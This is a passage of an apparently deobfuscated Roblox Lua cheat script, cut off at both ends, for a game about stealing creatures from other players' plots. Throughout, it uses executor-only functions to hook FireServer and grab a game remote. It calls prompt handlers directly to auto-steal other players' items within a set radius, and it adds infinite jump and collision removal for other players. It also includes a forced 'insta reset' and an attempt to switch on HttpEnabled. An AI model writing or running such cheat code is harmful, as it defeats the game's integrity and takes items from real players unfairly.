						tbl17.graceUntil = tick() + 0.75

						if autoSwitchLaggerCarryEnabled then
							fn37(false, false, true)
						else
							fn37(false, true, false)
						end
					end

					local function fn40()
						if not tbl17.applied and not tbl17.waiting then
							return
						end
						local applied = tbl17.applied
						local savedMode = tbl17.savedMode
						tbl17.applied = false
						tbl17.waiting = false
						tbl17.watchUntil = 0
						tbl17.graceUntil = 0
						tbl17.savedMode = nil
						if not applied then
							return
						end

						if savedMode == "Lagger" or savedMode == "Lagger Carry" then
							fn37(true, false)
						elseif savedMode == "Carry" then
							fn37(false, true)
						else
							fn37(false, false)
						end
					end

					autoCarryWatch = function(arg)
						if not (autoSwitchSpeedEnabled or autoSwitchLaggerCarryEnabled) then
							return
						end
						tbl17.waiting = true
						tbl17.watchUntil = tick() + (arg or 1.25)
					end

					RunService.RenderStepped:Connect(function()
						if not (autoSwitchSpeedEnabled or autoSwitchLaggerCarryEnabled) then
							fn40()
							return
						end
						local character = LP.Character
						local humanoid = character and character:FindFirstChildOfClass("Humanoid")
						local v86 = character and character:FindFirstChild("HumanoidRootPart")

						if not character or not humanoid or not v86 then
							fn40()
							tbl17.stealWasActive = false
							return
						end

						local state = humanoid:GetState()
						local flag18 = state == Enum.HumanoidStateType.Physics
							or state == Enum.HumanoidStateType.Ragdoll
							or state == Enum.HumanoidStateType.FallingDown
							or state == Enum.HumanoidStateType.Dead
						local flag19 = LP:GetAttribute("Stealing") == true or character:GetAttribute("Stealing") == true
						local v87 = fn38()

						if flag19 and not tbl17.stealWasActive then
							tbl17.stealWasActive = true
							fn39()
						elseif not flag19 then
							tbl17.stealWasActive = false
						end

						if tbl17.waiting then
							local flag20

							if flag18 then
								flag20 = flag18
							else
								local watchUntil = tbl17.watchUntil
								flag20 = tick() > watchUntil
							end

							if flag20 then
								tbl17.waiting = false
								tbl17.watchUntil = 0
							elseif v87 then
								fn39()
							end
						end

						if v87 and not tbl17.applied then
							fn39()
						end

						local applied = tbl17.applied

						if applied then
							if flag18 then
								applied = flag18
							else
								local graceUntil = tbl17.graceUntil
								applied = tick() > graceUntil and not v87 and not flag19
							end
						end

						if applied then
							fn40()
						end
					end)
				end
			end

			do
				fn33 = function()
					local str6 = string.lower(tostring(infJumpMode or "classic"))

					if str6 ~= "hold" then
						str6 = "classic"
					end

					infJumpMode = str6
					return str6
				end

				do
					local function fn36(arg)
						if not infJumpEnabled or fn33() ~= "classic" then
							return
						end
						local character = LP.Character
						if not character then
							return
						end
						local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")

						if humanoidRootPart and humanoidRootPart.Velocity.Y < 35 then
							humanoidRootPart.Velocity =
								Vector3.new(humanoidRootPart.Velocity.X, arg, humanoidRootPart.Velocity.Z)
						end
					end

					UIS.JumpRequest:Connect(function()
						fn36(50)
					end)

					UIS.InputBegan:Connect(function(input)
						if
							input.UserInputType == Enum.UserInputType.Keyboard
							and input.KeyCode == Enum.KeyCode.Space
							and not UIS:GetFocusedTextBox()
						then
							task.delay(0.12, function()
								if UIS:IsKeyDown(Enum.KeyCode.Space) then
									fn36(50)
								end
							end)
						end
					end)

					RunService.Heartbeat:Connect(function()
						local flag18 = infJumpEnabled

						if flag18 then
							local v86 = "classic"
							flag18 = fn33() == v86
						end

						if flag18 and UIS:IsKeyDown(Enum.KeyCode.Space) then
							fn36(50)
						end
					end)

					startHoldInfJump = function()
						if holdInfJumpConn then
							holdInfJumpConn:Disconnect()
						end

						holdInfJumpConn = RunService.Heartbeat:Connect(function()
							if not infJumpEnabled then
								return
							end
							local character = LP.Character
							if not character then
								return
							end
							local v86 = character:FindFirstChild("HumanoidRootPart")
							local humanoid = character:FindFirstChildOfClass("Humanoid")
							if not v86 or not humanoid then
								return
							end

							if (UIS:IsKeyDown(Enum.KeyCode.Space) or humanoid.Jump == true) and v86.Velocity.Y < 35 then
								v86.Velocity = Vector3.new(v86.Velocity.X, 55, v86.Velocity.Z)
							end

							if v86.Velocity.Y < -120 then
								v86.Velocity = Vector3.new(v86.Velocity.X, -120, v86.Velocity.Z)
							end
						end)
					end

					stopHoldInfJump = function()
						if holdInfJumpConn then
							holdInfJumpConn:Disconnect()
							holdInfJumpConn = nil
						end
					end

					classicInfJumpConn = nil

					startClassicInfJump = function()
						if classicInfJumpConn then
							classicInfJumpConn:Disconnect()
						end

						classicInfJumpConn = UIS.JumpRequest:Connect(function()
							fn36(50)
						end)
					end
				end
			end

			stopClassicInfJump = function()
				if classicInfJumpConn then
					classicInfJumpConn:Disconnect()
					classicInfJumpConn = nil
				end
			end

			applyInfJumpMode = function()
				stopHoldInfJump()
				stopClassicInfJump()
				if not infJumpEnabled then
					return
				end

				if fn33() == "hold" then
					startHoldInfJump()
				else
					startClassicInfJump()
				end
			end

			task.spawn(function()
				pcall(function()
					HS.HttpEnabled = true
					return
				end)
			end)

			pcall(function()
				if hookfunction and newcclosure then
					local v86 = nil
					local v87 = newcclosure

					local function fn36(arg, ...)
						if
							not cursedResetRemote
							and typeof(arg) == "Instance"
							and arg:IsA("RemoteEvent")
							and arg.Name:sub(1, 3) == "RE/"
						then
							cursedResetRemote = arg
						end

						return v86(arg, ...)
					end

					v86 = hookfunction
					v86 = v86(Instance.new("RemoteEvent").FireServer, v87(fn36))
				end
			end)

			task.spawn(function()
				task.wait(2)
				if cursedResetRemote then
					return
				end
				local ReplicatedStorage_ = game:GetService("ReplicatedStorage")

				for scanIndex, descendant in ipairs(ReplicatedStorage_:GetDescendants()) do
					if scanIndex % 300 == 0 then
						task.wait()
					end
					if descendant:IsA("RemoteEvent") and descendant.Name:sub(1, 3) == "RE/" then
						cursedResetRemote = descendant
						break
					end
				end

				if not cursedResetRemote then
					for scanIndex, descendant in ipairs(game:GetDescendants()) do
						if scanIndex % 300 == 0 then
							task.wait()
						end
						if descendant:IsA("RemoteEvent") and descendant.Name:sub(1, 3) == "RE/" then
							cursedResetRemote = descendant
							break
						end
					end
				end
			end)

			do
				local flag18 = false
				local thread = nil
				local v86 = nil
				local flag19 = false
				local flag20 = false

				local function fn36()
					flag20 = true

					if thread then
						pcall(function()
							task.cancel(thread)
						end)

						thread = nil
					end

					flag18 = false
					v86 = nil
					local character = LP.Character
					local humanoid = character and character:FindFirstChildOfClass("Humanoid")

					if humanoid then
						pcall(function()
							humanoid.HipHeight = 2

							for _, child in ipairs(character:GetChildren()) do
								if child:IsA("BasePart") then
									child.CanCollide = true
								end
							end
						end)
					end
				end

				local function fn37(arg)
					if flag18 then
						return
					end
					flag18 = true
					flag19 = false
					flag20 = false
					local character = LP.Character
					if not character then
						flag18 = false
						return
					end
					local v87 = character:FindFirstChildOfClass("Humanoid")
					if not v87 then
						flag18 = false
						return
					end
					v86 = character
					local flag21 = false

					thread = task.spawn(function()
						local hipHeight = v87.HipHeight
						local n32 = 0

						while true do
							local parent = character and character.Parent and v87
							local flag22

							if parent then
								flag22 = v87.Health > 0 or arg
							else
								flag22 = parent
							end

							flag22 = flag22 and not flag21 and not flag20

							if flag22 then
								if LP.Character ~= character then
									flag21 = true
									break
								else
									pcall(function()
										v87.HipHeight = 1e30
										v87.AutoRotate = true
										local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")

										if humanoidRootPart then
											humanoidRootPart.CanCollide = false
										end

										for _, child in ipairs(character:GetChildren()) do
											if child:IsA("BasePart") and child.Name ~= "HumanoidRootPart" then
												child.CanCollide = false
											end
										end
									end)

									if not character.Parent or LP.Character ~= character then
										flag19 = true
										break
									else
										n32 += 1
										if not (36 <= n32) then
											task.wait(0.05)
											continue
										end
									end
								end
							end

							break
						end

						if not flag19 and character and character.Parent and v87 then
							pcall(function()
								v87.Health = 0
							end)

							pcall(function()
								v87:ChangeState(Enum.HumanoidStateType.Dead)
							end)

							pcall(function()
								character:BreakJoints()
							end)

							task.wait(0.2)

							if not character.Parent or v87.Health <= 0 then
								flag19 = true
							end
						end

						if not flag19 and character and character.Parent and v87 then
							pcall(function()
								v87.HipHeight = hipHeight

								for _, child in ipairs(character:GetChildren()) do
									if child:IsA("BasePart") then
										child.CanCollide = true
									end
								end
							end)
						end

						flag18 = false
						thread = nil
						v86 = nil
						flag20 = false
					end)
				end

				LP.CharacterAdded:Connect(function()
					fn36()
					flag18 = false
					v86 = nil
					flag19 = false
					flag20 = false
				end)

				cursedInstaReset = function()
					fn37(false)
				end
			end
		end

		local fn36, aceNormalSteal, fn37, fn38, fn39, fn40, fn41, fn42

		do
			do
				do
					KB = {
						DropBrainrot = { kb = nil, gp = nil },
						AutoLeft = { kb = nil, gp = nil },
						AutoRight = { kb = nil, gp = nil },
						AutoBat = { kb = nil, gp = nil },
						TPFloor = { kb = nil, gp = nil },
						InstaReset = { kb = nil, gp = nil },
						GuiHide = { kb = nil, gp = nil },
						SpeedToggle = { kb = nil, gp = nil },
						LaggerToggle = { kb = nil, gp = nil },
						LaggerCarryToggle = { kb = nil, gp = nil },
					}

					do
						local vector = Vector3.new(-476.48, -6.28, 92.73)
						local vector2 = Vector3.new(-483.12, -4.95, 94.8)
						local vector3 = Vector3.new(-482.25, -6.93, 92.09)
						AP_L1 = vector
						AP_L2 = vector2
						AP_L_FACE = vector3
					end
				end

				do
					local vector = Vector3.new(-476.16, -6.28, 23.41)
					local vector2 = Vector3.new(-483.12, -5.03, 25.48)
					local vector3 = Vector3.new(-482.06, -6.93, 35.47)
					AP_R1 = vector
					AP_R2 = vector2
					AP_R_FACE = vector3
				end
			end

			do
				Steal = {
					AutoStealEnabled = true,
					StealRadius = 60,
					StealDuration = 1.3,
					StealRange = 10,
					EntryDelay = 0.3,
					HoldMax = 2.6,
					Data = {},
				}

				selectedStealMode = "Normal"
				selectedSemiMode = "V1"

				AceStealRadii = {
					Normal = 60,
					Semi = 10,
					SemiV2Radius = 60,
					SemiV2SemiRadius = 8,
				}

				AceSemiHoldMin = 0.2
				AceSemiHoldMax = 2.6
				AceSemiEntryDelay = 0.3
				isStealing = false
				stealStartTime = nil

				do
					local function fn43()
						return Steal.StealRadius or 60
					end

					Conns = { autoSteal = nil, antiRag = nil, anchor = {} }
					modeValLbl = nil
					lastMoveDir = Vector3.new(0, 0, 0)

					MOVE_KEYS = {
						[Enum.KeyCode.W] = true,
						[Enum.KeyCode.A] = true,
						[Enum.KeyCode.S] = true,
						[Enum.KeyCode.D] = true,
						[Enum.KeyCode.Up] = true,
						[Enum.KeyCode.Left] = true,
						[Enum.KeyCode.Down] = true,
						[Enum.KeyCode.Right] = true,
					}

					isRagdollState = function(arg)
						if not arg then
							return true
						end
						local state = arg:GetState()
						return arg.PlatformStand
							or state == Enum.HumanoidStateType.Physics
							or state == Enum.HumanoidStateType.Ragdoll
							or state == Enum.HumanoidStateType.FallingDown
					end

					isMyPlotByName = function(arg)
						local plots = workspace:FindFirstChild("Plots")
						if not plots then
							return false
						end
						local v86 = plots:FindFirstChild(arg)
						if not v86 then
							return false
						end
						local plotSign = v86:FindFirstChild("PlotSign")

						if plotSign then
							local v87 = plotSign:FindFirstChild("YourBase")
							if v87 and v87:IsA("BillboardGui") then
								return v87.Enabled == true
							end
						end

						return false
					end

					isNearPodiumWithPrompt = function()
						local character = LP.Character
						local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
						if not humanoidRootPart then
							return false
						end
						local plots = workspace:FindFirstChild("Plots")
						if not plots then
							return false
						end

						for _, child in ipairs(plots:GetChildren()) do
							if isMyPlotByName(child.Name) then
								continue
							end
							local animalPodiums = child:FindFirstChild("AnimalPodiums")
							if not animalPodiums then
								continue
							end

							for _, child2 in ipairs(animalPodiums:GetChildren()) do
								local base = child2:FindFirstChild("Base")
								if not base then
									continue
								end
								local spawn_ = base:FindFirstChild("Spawn")
								if not spawn_ then
									continue
								end
								local magnitude = (humanoidRootPart.Position - spawn_.Position).Magnitude
								if fn43() < magnitude then
									continue
								end
								local promptAttachment = spawn_:FindFirstChild("PromptAttachment")
								if not promptAttachment then
									continue
								end

								for _, child3 in ipairs(promptAttachment:GetChildren()) do
									if child3:IsA("ProximityPrompt") and child3.Enabled then
										return true, magnitude
									end
								end
							end
						end

						return false, math.huge
					end

					findNearestPrompt = function(arg)
						local v86 = arg or fn43()
						local character = LP.Character
						if not character then
							return nil
						end
						local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
						if not humanoidRootPart then
							return nil
						end
						local plots = workspace:FindFirstChild("Plots")

						if not plots then
							return nil
						end

						local huge = math.huge
						local v87 = nil

						for _, child in ipairs(plots:GetChildren()) do
							if not isMyPlotByName(child.Name) then
								local animalPodiums = child:FindFirstChild("AnimalPodiums")

								if animalPodiums then
									for _, child2 in ipairs(animalPodiums:GetChildren()) do
										local spawn_ = child2:FindFirstChild("Base")
										spawn_ = spawn_ and spawn_:FindFirstChild("Spawn")

										if spawn_ then
											local magnitude = (spawn_.Position - humanoidRootPart.Position).Magnitude

											if magnitude <= v86 and huge > magnitude then
												local promptAttachment = spawn_:FindFirstChild("PromptAttachment")

												if promptAttachment then
													for _, child3 in ipairs(promptAttachment:GetChildren()) do
														if
															child3:IsA("ProximityPrompt")
															and child3.ActionText:find("Steal")
														then
															v87 = child3
															huge = magnitude
														end
													end
												end
											end
										end
									end
								end
							end
						end

						return v87
					end
				end
			end

			do
				local fn43

				do
					fn36 = function(arg)
						local v86 = ipairs
						local tbl17 = arg or {}

						for _, v87 in v86(tbl17) do
							task.spawn(function()
								pcall(v87)
							end)
						end
					end

					_G.AceNormalSteal = _G.AceNormalSteal
						or {
							enabled = false,
							radius = 60,
							duration = 1.3,
							animals = {},
							promptCache = {},
							internalCache = {},
							scannerStarted = false,
							isStealing = false,
							stealConn = nil,
							lastSteal = 0,
							cooldown = 0.08,
						}

					aceNormalSteal = _G.AceNormalSteal

					fn37 = function(arg)
						local n32 = math.clamp(tonumber(arg) or 0, 0, 1)

						pcall(function()
							if GrabBar then
								GrabBar.Visible = false
							end

							if grabFill then
								grabFill.Size = UDim2.new(n32, 0, 1, 0)
							end

							if grabPct then
								grabPct.Text = string.format("AUTO GRAB  %d%%", math.floor(n32 * 100 + 0.5))
							end

							if _G.StealBar then
								_G.StealBar.SetState("STEALING")
								_G.StealBar.SetProgress(n32)
							end
						end)
					end

					fn38 = function()
						pcall(function()
							if _G.StealBar then
								_G.StealBar.Reset()
							end

							if grabFill then
								grabFill.Size = UDim2.new(0, 0, 1, 0)
							end

							if grabPct then
								grabPct.Text = "AUTO GRAB  0%"
							end

							return
						end)
					end

					do
						local function fn44(arg)
							local v86 = workspace:FindFirstChild("Plots")
							v86 = v86 and v86:FindFirstChild(arg)
							if not v86 then
								return false
							end
							local yourBase = v86:FindFirstChild("PlotSign")
							yourBase = yourBase and yourBase:FindFirstChild("YourBase")
							return yourBase and yourBase:IsA("BillboardGui") and yourBase.Enabled == true
						end

						fn39 = function()
							aceNormalSteal.animals = {}
							local plots = workspace:FindFirstChild("Plots")
							if not plots then
								return
							end

							for _, child in ipairs(plots:GetChildren()) do
								if child:IsA("Model") and not fn44(child.Name) then
									local animalPodiums = child:FindFirstChild("AnimalPodiums")

									if animalPodiums then
										for _, child2 in ipairs(animalPodiums:GetChildren()) do
											if child2:IsA("Model") then
												local base = child2:FindFirstChild("Base")
												base = base and base:FindFirstChild("Spawn")

												if base then
													table.insert(aceNormalSteal.animals, {
														plot = child.Name,
														slot = child2.Name,
														worldPosition = base.Position,
														uid = child.Name .. "_" .. child2.Name,
													})
												end
											end
										end
									end
								end
							end
						end

						fn40 = function()
							if aceNormalSteal.scannerStarted then
								return
							end
							aceNormalSteal.scannerStarted = true

							task.spawn(function()
								task.wait(1)

								while _G.AceNormalSteal do
									if aceNormalSteal.enabled then
										pcall(fn39)
									end

									task.wait(3)
								end
							end)
						end

						fn41 = function(arg)
							if not arg then
								return nil
							end
							local v86 = aceNormalSteal.promptCache[arg.uid]
							if v86 and v86.Parent then
								return v86
							end
							local v87 = workspace:FindFirstChild("Plots")
							local animalPodiums = v87 and v87:FindFirstChild(arg.plot)
							animalPodiums = animalPodiums and animalPodiums:FindFirstChild("AnimalPodiums")
							animalPodiums = animalPodiums and animalPodiums:FindFirstChild(arg.slot)
							animalPodiums = animalPodiums and animalPodiums:FindFirstChild("Base")
							animalPodiums = animalPodiums and animalPodiums:FindFirstChild("Spawn")
							animalPodiums = animalPodiums and animalPodiums:FindFirstChild("PromptAttachment")
							if not animalPodiums then
								return nil
							end

							for _, child in ipairs(animalPodiums:GetChildren()) do
								if child:IsA("ProximityPrompt") then
									aceNormalSteal.promptCache[arg.uid] = child
									return child
								end
							end

							return nil
						end

						fn42 = function(arg)
							if aceNormalSteal.internalCache[arg] then
								return
							end
							local tbl17 = { hold = {}, trigger = {}, ready = true }

							pcall(function()
								if getconnections then
									for _, v86 in ipairs(getconnections(arg.PromptButtonHoldBegan)) do
										if type(v86.Function) == "function" then
											table.insert(tbl17.hold, v86.Function)
										end
									end

									for _, v86 in ipairs(getconnections(arg.Triggered)) do
										local v87 = "function"

										if type(v86.Function) == v87 then
											table.insert(tbl17.trigger, v86.Function)
										end
									end
								end
							end)

							if #tbl17.hold > 0 or #tbl17.trigger > 0 then
								aceNormalSteal.internalCache[arg] = tbl17
							end
						end

						fn43 = function()
							local character = LP.Character

							if character then
								character = character:FindFirstChild("HumanoidRootPart")
									or character:FindFirstChild("UpperTorso")
							end

							if not character then
								return nil
							end
							local huge = math.huge
							local v86 = nil

							for _, animal in ipairs(aceNormalSteal.animals) do
								if animal.worldPosition and not fn44(animal.plot) then
									local magnitude = (character.Position - animal.worldPosition).Magnitude

									if magnitude < huge then
										huge = magnitude
										v86 = animal
									end
								end
							end

							local flag18

							if v86 then
								flag18 = huge <= tonumber(Steal.StealRadius or 60)
							else
								flag18 = v86
							end

							return flag18 and v86 or nil
						end
					end
				end

				do
					local function fn44(arg)
						if not arg or not arg.Parent or aceNormalSteal.isStealing then
							return
						end

						if tick() - (aceNormalSteal.lastSteal or 0) < (aceNormalSteal.cooldown or 0.3) then
							return
						end
						fn42(arg)
						local v86 = aceNormalSteal.internalCache[arg]
						if not v86 or not v86.ready then
							return
						end
						v86.ready = false
						aceNormalSteal.isStealing = true
						aceNormalSteal.lastSteal = tick()
						isStealing = true
						stealStartTime = tick()

						task.spawn(function()
							for _, v87 in ipairs(v86.hold) do
								task.spawn(function()
									pcall(v87)
								end)
							end

							local now2 = tick()
							local duration = math.max(0.05, tonumber(Steal.StealDuration) or 0.2)
							aceNormalSteal.duration = duration

							while aceNormalSteal.enabled and Steal.AutoStealEnabled and tick() - now2 < duration do
								fn37((tick() - now2) / duration)
								task.wait(0.02)
							end

							if not aceNormalSteal.enabled or not Steal.AutoStealEnabled then
								v86.ready = true
								aceNormalSteal.isStealing = false
								isStealing = false
								stealStartTime = nil
								fn38()
								return
							end

							fn37(1)

							for _, v87 in ipairs(v86.trigger) do
								task.spawn(function()
									pcall(v87)
								end)
							end

							pcall(function()
								if _G.AutoCarrySpeed and _G.AutoCarrySpeed.WatchPickup then
									_G.AutoCarrySpeed.WatchPickup(1.25)
								end
							end)

							task.wait(0.12)
							v86.ready = true
							aceNormalSteal.isStealing = false
							isStealing = false
							stealStartTime = nil
							fn38()
						end)
					end

					_G.AceNormalAutoStealStart = function()
						aceNormalSteal.radius = tonumber(Steal.StealRadius) or aceNormalSteal.radius or 60
						aceNormalSteal.enabled = true
						Steal.AutoStealEnabled = true
						fn40()
						pcall(fn39)

						if aceNormalSteal.stealConn then
							aceNormalSteal.stealConn:Disconnect()
						end

						aceNormalSteal.stealConn = RunService.Heartbeat:Connect(function()
							if
								not aceNormalSteal.enabled
								or not Steal.AutoStealEnabled
								or aceNormalSteal.isStealing
							then
								return
							end
							aceNormalSteal.radius = tonumber(Steal.StealRadius) or aceNormalSteal.radius
							local v86 = fn43()
							v86 = v86 and fn41(v86)

							if v86 then
								fn44(v86)
							end
						end)
					end
				end
			end
		end

		do
			do
				_G.AceNormalAutoStealStop = function()
					aceNormalSteal.enabled = false
					aceNormalSteal.isStealing = false

					if aceNormalSteal.stealConn then
						aceNormalSteal.stealConn:Disconnect()
						aceNormalSteal.stealConn = nil
					end

					isStealing = false
					stealStartTime = nil
					fn38()
				end

				_G.AceSemiSteal = _G.AceSemiSteal
					or {
						enabled = false,
						isStealing = false,
						conn = nil,
						lastSteal = 0,
						cooldown = 0.05,
					}

				do
					local aceSemiSteal = _G.AceSemiSteal

					local function fn43()
						local character = LP.Character

						if character then
							character = character:FindFirstChild("HumanoidRootPart")
								or character:FindFirstChild("UpperTorso")
						end

						if not character then
							return nil
						end
						local huge = math.huge
						local v86, v87, v88 = ipairs(aceNormalSteal.animals or {})
						local v89 = nil

						for _, v90 in v86, v87, v88 do
							local worldPosition = v90.worldPosition
							worldPosition = worldPosition and (character.Position - worldPosition).Magnitude
								or math.huge

							if worldPosition < huge and worldPosition <= 80 then
								huge = worldPosition
								v89 = v90
							end
						end

						return v89, huge
					end

					local function fn44(arg, arg2)
						if aceSemiSteal.isStealing or not arg or not arg2 or not arg2.Parent then
							return
						end

						if tick() - (aceSemiSteal.lastSteal or 0) < aceSemiSteal.cooldown then
							return
						end
						fn42(arg2)
						local v86 = aceNormalSteal.internalCache[arg2]
						if not v86 or not v86.ready then
							return
						end
						v86.ready = false
						aceSemiSteal.isStealing = true
						aceSemiSteal.lastSteal = tick()
						isStealing = true
						stealStartTime = tick()

						task.spawn(function()
							local flag18 = selectedSemiMode == "V3"
							local n32

							if flag18 then
								n32 = (tonumber(Steal.StealDuration) or 0.2) * 1
							else
								n32 = flag18
							end

							n32 = n32 or tonumber(Steal.StealDuration) or AceSemiHoldMin
							local num = tonumber(Steal.HoldMax) or AceSemiHoldMax
							local semi = tonumber(Steal.StealRange) or AceStealRadii.Semi
							local num2 = tonumber(Steal.EntryDelay) or AceSemiEntryDelay

							for _, v87 in ipairs(v86.hold) do
								task.spawn(function()
									pcall(v87)
								end)
							end

							local now2 = tick()

							while aceSemiSteal.enabled and selectedStealMode == "Semi" and tick() - now2 < n32 do
								fn37((tick() - now2) / num)
								task.wait(0.02)
							end

							local flag19

							while true do
								local flag20 = aceSemiSteal.enabled
									and selectedStealMode == "Semi"
									and arg2.Parent
									and tick() - now2 < num
								flag19 = false

								if flag20 then
									fn37((tick() - now2) / num)
									local v87
									v87, v87 = fn43()

									if v87 and v87 <= semi then
										if num2 > 0 then
											task.wait(num2)
										end

										if aceSemiSteal.enabled and selectedStealMode == "Semi" then
											fn36(v86.trigger)
											flag19 = true
										end

										break
									else
										task.wait(0.02)
										continue
									end
								end

								break
							end

							if not flag19 and aceSemiSteal.enabled and selectedStealMode == "Semi" and arg2.Parent then
								fn36(v86.trigger)
								fn37(1)
							end

							task.wait(aceSemiSteal.enabled and 0.1 or 0)
							v86.ready = true
							aceSemiSteal.isStealing = false
							isStealing = false
							stealStartTime = nil
							fn38()
						end)
					end

					local tbl17 = {
						enabled = false,
						isStealing = false,
						conn = nil,
						lastSteal = 0,
						cooldown = 0.05,
					}

					local function fn45(arg, arg2)
						if tbl17.isStealing or not arg or not arg2 or not arg2.Parent then
							return
						end

						if tick() - (tbl17.lastSteal or 0) < tbl17.cooldown then
							return
						end
						fn42(arg2)
						local v86 = aceNormalSteal.internalCache[arg2]
						if not v86 or not v86.ready then
							return
						end
						v86.ready = false
						tbl17.isStealing = true
						tbl17.lastSteal = tick()
						isStealing = true
						stealStartTime = tick()

						task.spawn(function()
							local v87 = 0.2
							local semiV2Radius = AceStealRadii.SemiV2Radius or 60
							local semiV2SemiRadius = AceStealRadii.SemiV2SemiRadius or 8

							for _, v88 in ipairs(v86.hold) do
								task.spawn(function()
									pcall(v88)
								end)
							end

							local now2 = tick()

							while true do
								if
									tbl17.enabled
									and selectedStealMode == "Semi"
									and selectedSemiMode == "V2"
									and tick() - now2 < v87
								then
									local v88
									v88, v88 = fn43()

									if not (not v88 or v88 > semiV2Radius) then
										fn37((tick() - now2) / 2.69)
										task.wait()
										continue
									end
								end

								break
							end

							local flag18

							while true do
								local flag19 = tbl17.enabled
									and selectedStealMode == "Semi"
									and selectedSemiMode == "V2"
									and tick() - now2 < 2.69
								flag18 = false

								if flag19 then
									local v88
									v88, v88 = fn43()

									if v88 and v88 <= semiV2SemiRadius then
										task.wait(0.3)
										local parent = tbl17.enabled and arg2.Parent
										local flag20 = false

										if parent then
											fn36(v86.trigger)
											fn37(1)
											flag18 = true
										else
											flag18 = flag20
										end

										break
									else
										local flag20 = not v88 or v88 > semiV2Radius
										local flag21 = false

										if flag20 then
											flag18 = flag21
											break
										else
											fn37((tick() - now2) / math.max(2.64, 0.05))
											task.wait()
											continue
										end
									end
								end

								break
							end

							if not flag18 and tbl17.enabled and arg2.Parent and selectedSemiMode == "V2" then
								fn36(v86.trigger)
								fn37(1)
							end

							v86.ready = true
							tbl17.isStealing = false
							isStealing = false
							stealStartTime = nil
							fn38()
						end)
					end

					_G.AceSemiV2AutoStealStart = function()
						tbl17.enabled = true
						aceNormalSteal.enabled = true
						fn40()
						pcall(fn39)

						if tbl17.conn then
							tbl17.conn:Disconnect()
						end

						tbl17.conn = RunService.Heartbeat:Connect(function()
							if
								not tbl17.enabled
								or not Steal.AutoStealEnabled
								or selectedStealMode ~= "Semi"
								or selectedSemiMode ~= "V2"
								or tbl17.isStealing
							then
								return
							end
							local v86, v87 = fn43()
							local flag18

							if v86 then
								flag18 = v87 <= (AceStealRadii.SemiV2Radius or 60)
							else
								flag18 = v86
							end

							if flag18 then
								local v88 = fn41(v86)

								if v88 then
									fn45(v86, v88)
								end
							end
						end)
					end

					_G.AceSemiV2AutoStealStop = function()
						tbl17.enabled = false
						tbl17.isStealing = false

						if tbl17.conn then
							tbl17.conn:Disconnect()
							tbl17.conn = nil
						end

						isStealing = false
						stealStartTime = nil
						fn38()
					end

					_G.AceSemiAutoStealStart = function()
						aceSemiSteal.enabled = true
						aceNormalSteal.enabled = true
						fn40()
						pcall(fn39)

						if aceSemiSteal.conn then
							aceSemiSteal.conn:Disconnect()
						end

						aceSemiSteal.conn = RunService.Heartbeat:Connect(function()
							if
								not aceSemiSteal.enabled
								or not Steal.AutoStealEnabled
								or selectedStealMode ~= "Semi"
								or selectedSemiMode == "V2"
								or aceSemiSteal.isStealing
							then
								return
							end
							local v86 = fn43()
							local v87 = v86 and fn41(v86)

							if v87 then
								fn44(v86, v87)
							end
						end)
					end

					_G.AceSemiAutoStealStop = function()
						aceSemiSteal.enabled = false
						aceSemiSteal.isStealing = false

						if aceSemiSteal.conn then
							aceSemiSteal.conn:Disconnect()
							aceSemiSteal.conn = nil
						end

						isStealing = false
						stealStartTime = nil
						fn38()
					end
				end
			end

			_G.AceAutoStealSync = function()
				if not Steal.AutoStealEnabled then
					_G.AceNormalAutoStealStop()
					_G.AceSemiAutoStealStop()
					_G.AceSemiV2AutoStealStop()
					return
				end

				if selectedStealMode == "Semi" then
					_G.AceNormalAutoStealStop()

					if selectedSemiMode == "V2" then
						_G.AceSemiV2AutoStealStart()
					else
						_G.AceSemiAutoStealStart()
					end
				else
					_G.AceSemiAutoStealStop()
					_G.AceSemiV2AutoStealStop()
					_G.AceNormalAutoStealStart()
				end
			end

			startAutoSteal = function()
				_G.AceAutoStealSync()
			end

			stopAutoSteal = function()
				Steal.AutoStealEnabled = false
				_G.AceNormalAutoStealStop()
				_G.AceSemiAutoStealStop()
				_G.AceSemiV2AutoStealStop()
			end

			RunService.Stepped:Connect(function()
				for _, player_ in ipairs(Players:GetPlayers()) do
					if player_ ~= LP and player_.Character then
						for _, descendant in ipairs(player_.Character:GetDescendants()) do
							if descendant:IsA("BasePart") then
								descendant.CanCollide = false
							end
						end
					end
				end
			end)

			LP.CharacterAdded:Connect(function(character)
				task.wait(0.5)
				setupSpeedIndicator(character)

				if unwalkEnabled then
					task.wait(0.5)
					startUnwalk()
				end

				if refreshSpeedModeLabel then
					refreshSpeedModeLabel()
				end

				if mobBtnRefs.carrySpeed then
					mobBtnRefs.carrySpeed(carrySpeedActive)
				end

				if mobBtnRefs.lagger then
					mobBtnRefs.lagger(laggerModeEnabled)
				end
			end)

			if LP.Character then
				setupSpeedIndicator(LP.Character)
			end

			alConn = nil
			arConn = nil

			do
				local v86 = 1
				alPhase = 1
				arPhase = v86
			end
		end

		do
			do
				fn34 = function()
					if not (safeModeEnabled and autoBatEnabled) then
						return false
					end
					local autoLeftEnabled_ = autoLeftEnabled or State and State.autoLeftEnabled
					local flag18 = false

					if autoLeftEnabled_ then
						flag18 = true
						stopAutoLeft()
					end

					local v86 = autoRightEnabled
					local autoRightEnabled_

					if v86 then
						autoRightEnabled_ = v86
					else
						autoRightEnabled_ = State and State.autoRightEnabled
					end

					if autoRightEnabled_ then
						stopAutoRight()
						flag18 = true
					end

					return flag18
				end

				stopAutoLeft = function()
					autoLeftEnabled = false
					State.autoLeftEnabled = false

					if alConn then
						alConn:Disconnect()
						alConn = nil
					end

					alPhase = 1
					local character = LP.Character

					if character then
						local humanoid = character:FindFirstChildOfClass("Humanoid")
						local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")

						if humanoid then
							humanoid:Move(Vector3.zero, false)
							humanoid.WalkSpeed = getActiveMoveSpeed()
						end

						if humanoidRootPart then
							humanoidRootPart.AssemblyLinearVelocity =
								Vector3.new(0, humanoidRootPart.AssemblyLinearVelocity.Y, 0)
						end
					end

					if autoLeftSetVisual then
						autoLeftSetVisual(false)
					end

					if mobBtnRefs.autoLeft then
						mobBtnRefs.autoLeft(false)
					end

					if toggleRefs.autoLeft then
						toggleRefs.autoLeft(false)
					end

					if setAL then
						setAL(false)
					end
				end

				stopAutoRight = function()
					autoRightEnabled = false
					State.autoRightEnabled = false

					if arConn then
						arConn:Disconnect()
						arConn = nil
					end

					arPhase = 1
					local character = LP.Character

					if character then
